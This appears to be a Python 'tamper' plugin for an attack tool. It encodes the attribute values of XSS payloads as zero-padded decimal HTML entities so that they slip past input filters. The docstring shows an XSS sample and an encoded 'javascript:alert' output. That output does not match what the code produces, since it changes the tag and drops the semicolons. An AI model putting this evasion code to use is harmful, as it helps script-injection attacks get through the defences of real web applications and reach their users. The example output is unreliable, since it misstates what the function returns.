# -*- coding: utf-8 -*
import re
from main_modules.settings import PRIORITY
__priority__ = PRIORITY.HIGHEST



def tamper(payload, **kwargs):
    """
   

    >>> tamper("<script src=# onerror=alert(1)>")
<IMG SRC="/x" onerror=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
    """
    result=[]
    string=re.sub(r"(?<=[=:])[\S]*(?=[;<>\s/\\])",convert_this,str(payload))

    return (string) if payload else payload

def convert_this(string):
    new_word=[]
    string=string.group()
    for letter in string:
        len_letter=len(str(ord(letter)))
        letter='0'*(7-len_letter)+str(ord(letter))
        new_word.append('&#'+letter+';')
    new_word=''.join(new_word)
    return new_word

